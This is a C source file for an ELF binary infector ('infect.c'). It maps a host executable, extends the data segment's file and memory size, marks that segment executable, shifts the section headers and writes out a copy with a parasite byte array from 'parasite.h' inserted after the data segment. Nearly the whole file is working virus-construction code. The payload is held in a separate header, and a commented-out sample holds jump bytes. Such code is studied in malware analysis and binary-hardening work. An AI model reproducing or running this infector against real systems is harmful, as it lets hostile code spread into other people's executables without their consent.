/*
 * infect.c
 * This is an ELF binary infector that inserts the parasite after the data
 * segment and essentially extends the bss segment backwards.
 */

#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <elf.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include"parasite.h"

// char parasite[] =
//     "\xe9\xdb<\xde\xff\xe9\xe6<\xde\xff\xe9\xf1<\xde\xff\xe9\xfc<\xde\xff\xe9\x07=\xde\xff\xe9\x12=\xde\xff\xe9\x1d=\xde\xff\xe9(=\xde\xff\xe93=";

int main(int argc, char **argv)
{
    int fd, i, ofd, c;
    unsigned int parasite_size, oe_shoff;
    struct stat st;
    unsigned char *mem;
    long bss_addr;

    /* Ehdr, Phdr, Shdr */
    Elf64_Ehdr *e_hdr;
    Elf64_Phdr *p_hdr;
    Elf64_Shdr *s_hdr;

    if (argc < 2)
    {
        printf("Usage: %s <elf-host> <elf-output>\n", argv[0]);
        exit(-1);
    }

    if ((fd = open(argv[1], O_RDONLY)) == -1)
    {
        perror("open");
        exit(-1);
    }

    if ((fstat(fd, &st)) < 0)
    {
        perror("fstat");
        exit(-1);
    }

    mem = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);

    if (mem == MAP_FAILED)
    {
        perror("mmap");
        exit(-1);
    }

    e_hdr = (Elf64_Ehdr *)mem;

    if (e_hdr->e_ident[0] != 0x7F && strcmp(&e_hdr->e_ident[1], "ELF"))
    {
        printf("[!] %s is not an elf file\n", argv[1]);
        exit(-1);
    }

    /*
     * Increase ehdr->e_shoff
     */
    parasite_size = sizeof(parasite);
    oe_shoff = e_hdr->e_shoff;
    e_hdr->e_shoff += parasite_size;

    /*
     * extend p_filesz && p_memsz in data segment
     */
    p_hdr = (Elf64_Phdr *)(mem + e_hdr->e_phoff);
    for (i = 0; i < e_hdr->e_phnum; i++)
    {
        /*
         * p_type == PT_LOAD && offset != 0 hit data segment
         */
        if (p_hdr[i].p_type == PT_LOAD)
        {
            if (p_hdr[i].p_offset != 0)
            {
                bss_addr = p_hdr[i].p_offset + p_hdr[i].p_filesz;
                printf("[+] Origin bss address: %#lx\n", bss_addr);
                /*
                 * add p_filesz && p_memsz
                 */
                p_hdr[i].p_filesz += parasite_size;
                p_hdr[i].p_memsz += parasite_size;
                /*
                 * Set executable permissions on data segment
                 */
                p_hdr[i].p_flags |= PF_X;
            }
        }
    }

    /*
     * Adjust .bss section
     */
    s_hdr = (Elf64_Shdr *)(mem + oe_shoff);
    for (i = 0; i < e_hdr->e_shnum; i++)
    {
        if (s_hdr[i].sh_offset >= bss_addr)
        {
            s_hdr[i].sh_offset += parasite_size;
            s_hdr[i].sh_addr += parasite_size;
        }
    }

    /*
     * Inject code
     */
    if ((ofd = open(argv[2], O_CREAT | O_WRONLY | O_TRUNC, st.st_mode)) == -1)
    {
        perror("open");
        exit(-1);
    }

    if ((c = write(ofd, mem, bss_addr)) != bss_addr)
    {
        perror("[!] Failed writing ehdr");
        exit(-1);
    }

    if ((c = write(ofd, parasite, parasite_size)) != parasite_size)
    {
        perror("[!] Failed writing parasite");
        exit(-1);
    }

    mem += bss_addr;
    if ((c = write(ofd, mem, st.st_size - bss_addr)) != st.st_size - bss_addr)
    {
        perror("[!] Failed writing binary");
        exit(-1);
    }

    close(ofd);
    munmap(mem, st.st_size);
    close(fd);
    return 0;
}